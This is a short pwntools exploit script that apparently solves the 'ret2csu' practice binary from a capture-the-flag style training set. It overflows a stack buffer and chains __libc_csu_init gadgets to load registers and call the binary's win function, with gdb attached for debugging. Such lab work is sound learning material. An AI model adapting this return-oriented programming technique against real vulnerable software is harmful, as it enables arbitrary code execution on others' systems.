from pwn import *
from pwnlib.util.iters import flatten

pop_rdi = 0x00000000004006a3
pop_rsi_pop_r15 = 0x00000000004006a1
pop_rbx_rbp_r12_r13_r14_r15 = 0x40069a
call_deref_r12rbx_add8 = 0x400680

io = process('./ret2csu')
elf = io.elf
gdb.attach(io, 'b *(pwnme+150)')

rop = flat([
    #p64(elf.symbols['ret2win']), # populate plt got entry
    p64(pop_rbx_rbp_r12_r13_r14_r15),
    p64(0), # rbx
    p64(1), # rbp
    p64(0x600e48), # r12 -> call [r12] (pointer to _fini)
    p64(0x4200cafe), # r13 -> edi
    p64(0xcafebabecafebabe), # r14 -> rsi
    p64(0xd00df00dd00df00d), # r15 -> rdx
    p64(call_deref_r12rbx_add8), # need to call somewhere with no side effects;
    p64(0x4200cafe) * 7,
    p64(pop_rdi),
    p64(0xdeadbeefdeadbeef),
    p64(elf.symbols['ret2win']), 
])

#rop = flat([
#    p64(pop_rdi),
#    p64(0xdeadbeefdeadbeef),
#    p64(pop_rsi_pop_r15),
#    p64(0xcafebabecafebabe),
#    p64(0),
#])


io.sendline(b'a' * 0x28 + rop)
io.interactive()
